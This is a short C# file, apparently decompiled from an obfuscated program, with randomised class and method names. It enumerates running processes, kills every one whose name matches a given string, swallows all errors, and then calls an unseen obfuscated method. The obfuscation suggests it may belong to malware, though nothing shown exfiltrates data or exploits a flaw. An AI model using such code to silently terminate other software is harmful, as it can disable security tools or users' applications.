using System;
using System.ComponentModel;
using System.Diagnostics;

namespace MufMaOSvGyvz;

public class vuLsRXwWyejEQ
{
	public static bool WlANBWeixWsiJ(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (Win32Exception)
		{
			return false;
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void SgSstmnvQSBQg(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (WlANBWeixWsiJ(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					IyUWqQZlcOSTLhq.obllpHNmyTXvR();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
